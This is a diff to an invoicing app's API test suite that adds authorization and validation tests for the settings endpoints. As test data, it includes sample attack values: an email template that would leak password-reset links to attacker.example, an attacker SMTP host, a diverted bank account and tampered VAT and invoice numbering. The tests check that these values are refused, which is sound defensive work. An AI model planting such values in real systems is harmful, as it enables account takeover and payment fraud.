@@ -33,6 +33,7 @@ const protectedRoutes: [Method, string][] = [
     ['get', '/search'],
     ['get', '/settings'],
     ['put', '/settings'],
+    ['delete', '/settings'],
     ['post', '/email'],
     ['put', `/pdf/${missingId}`],
     ['get', '/users'],
@@ -46,6 +47,8 @@ const adminOnlyRoutes: [Method, string][] = [
     ['put', `/user/${missingId}`],
     ['delete', `/user/${missingId}`],
     ['delete', `/user/avatar/${missingId}`],
+    ['put', '/settings'],
+    ['delete', '/settings'],
 ];
 
 test.describe('without a valid token', () => {
@@ -139,8 +142,124 @@ test.describe('mail server settings', () => {
             data: { host: 'smtp.attacker.example', username: 'attacker', password: 'x' },
         });
 
-        expect((await response.json()).success).toBe(true);
+        expect(response.status()).toBe(403);
         expect(await readHost()).toBe(hostBefore);
+    });
+});
+
+test.describe('settings', () => {
+    const readSettings = async (request: APIRequestContext, token: string) =>
+        (await (await call(request, 'get', '/settings', token)).json()).data[0];
+
+    const putSettings = (request: APIRequestContext, token: string, data: object) =>
+        request.put(`${apiUrl}/settings`, { headers: apiHeaders(token), data });
+
+    // Changing any of these as a regular user would, in turn: put a reset link inside an
+    // attacker's URL, divert invoice payments, or change the VAT and invoice numbering
+    const attacks = {
+        forgotHtml: '<img src="https://attacker.example/?t=[RESTORE_LINK]">',
+        forgotText: 'https://attacker.example/?t=[RESTORE_LINK]',
+        companyBankAccount: 'EE00 ATTACKER',
+        companyBankAccount2: 'EE00 ATTACKER 2',
+        vat: '0',
+        lastInvoiceId: '1',
+        invoiceFilenamePrefix: 'attacker_',
+    };
+
+    test('a regular user can read but not change them', async ({ request }) => {
+        const adminToken = await getApiToken(request);
+        const userToken = await getApiToken(request, getRegularUser());
+        const before = await readSettings(request, adminToken);
+
+        expect((await readSettings(request, userToken)).vat).toBe(before.vat);
+
+        for (const [key, value] of Object.entries(attacks)) {
+            const response = await putSettings(request, userToken, { [key]: value });
+
+            expect(response.status(), `PUT ${key}`).toBe(403);
+            expect(await response.json()).toEqual({ success: false, message: 'forbidden' });
+        }
+
+        expect(await readSettings(request, adminToken)).toEqual(before);
+    });
+
+    test('a regular user cannot upload or remove the logo', async ({ request }) => {
+        const adminToken = await getApiToken(request);
+        const userToken = await getApiToken(request, getRegularUser());
+        const before = await readSettings(request, adminToken);
+        const png = Buffer.from(
+            'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
+            'base64'
+        );
+
+        const upload = await request.put(`${apiUrl}/settings`, {
+            headers: apiHeaders(userToken),
+            multipart: { logo: { name: 'logo.png', mimeType: 'image/png', buffer: png } },
+        });
+        const remove = await call(request, 'delete', '/settings', userToken);
+
+        expect(upload.status()).toBe(403);
+        expect(remove.status()).toBe(403);
+        expect((await readSettings(request, adminToken)).logo).toBe(before.logo);
+    });
+
+    test('keys that are not settings are refused, and nothing is saved', async ({ request }) => {
+        const token = await getApiToken(request);
+        const before = await readSettings(request, token);
+
+        for (const key of ['id', 'name', 'role', 'JWT_SECRET', 'notASetting']) {
+            const response = await putSettings(request, token, {
+                companyAddress2: 'should not be saved',
+                [key]: 'x',
+            });
+
+            expect(await response.json(), key).toEqual({
+                success: false,
+                message: 'settingsInvalid',
+            });
+        }
+
+        expect(await readSettings(request, token)).toEqual(before);
+    });
+
+    test('values that would break invoicing are refused', async ({ request }) => {
+        const token = await getApiToken(request);
+        const before = await readSettings(request, token);
+
+        for (const data of [
+            { vat: 'abc' },
+            { vat: '124' },
+            { lastInvoiceId: 'abc' },
+            { lastInvoiceId: '-5' },
+            { port: '99999' },
+        ]) {
+            expect(await (await putSettings(request, token, data)).json()).toEqual({
+                success: false,
+                message: 'settingsInvalid',
+            });
+        }
+
+        expect(await readSettings(request, token)).toEqual(before);
+    });
+
+    test('an admin can still change them', async ({ request }) => {
+        const token = await getApiToken(request);
+        const before = (await readSettings(request, token)).companyAddress2;
+
+        try {
+            const response = await putSettings(request, token, {
+                companyAddress2: `${before} (authorization test)`,
+            });
+
+            expect((await response.json()).success).toBe(true);
+            expect((await readSettings(request, token)).companyAddress2).toBe(
+                `${before} (authorization test)`
+            );
+        } finally {
+            await putSettings(request, token, { companyAddress2: before });
+        }
+
+        expect((await readSettings(request, token)).companyAddress2).toBe(before);
     });
 });
 
